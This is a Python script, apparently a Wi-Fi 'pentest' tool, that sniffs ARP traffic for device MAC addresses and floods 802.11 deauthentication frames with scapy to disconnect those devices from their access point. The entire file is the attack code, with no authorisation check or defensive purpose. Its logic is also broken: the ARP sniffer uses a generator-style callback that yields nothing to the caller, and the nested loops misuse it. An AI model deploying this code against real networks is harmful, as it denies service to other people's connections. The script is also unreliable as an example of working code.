import os
import concurrent.futures
import netifaces as ni
import socket
import time
from scapy.all import *

def enable_monitor_mode(interface):
    os.system(f"sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport {interface} sniff -c1")

def deauth(target_mac, access_point_mac):
    interface = "en0"
    packet_count = 100
    interval = 0.1
    conf.iface = interface
    pkt = (
        RadioTap()
        / Dot11(addr1=target_mac, addr2=access_point_mac, addr3=access_point_mac)
        / Dot11Deauth()
    )
    sendp(pkt, inter=interval, count=packet_count, verbose=0)

def monitor_arp_packets():
    def packet_handler(pkt):
        if ARP in pkt and pkt[ARP].op in (1, 2):  # who-has or is-at
            yield pkt[Ether].src
            yield pkt[Ether].dst

    sniff(prn=packet_handler, filter="arp", store=0)

def pentest():
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        for wifi in monitor_arp_packets():
            for device in monitor_arp_packets():
                try:
                    executor.submit(deauth, device, wifi)
                except Exception as e:
                    time.sleep(60)
                    executor.submit(deauth, device, wifi)

# Set your network interface here
interface = "en0"

# Enable monitor mode on the interface
enable_monitor_mode(interface)

# Start the pentesting process
pentest()
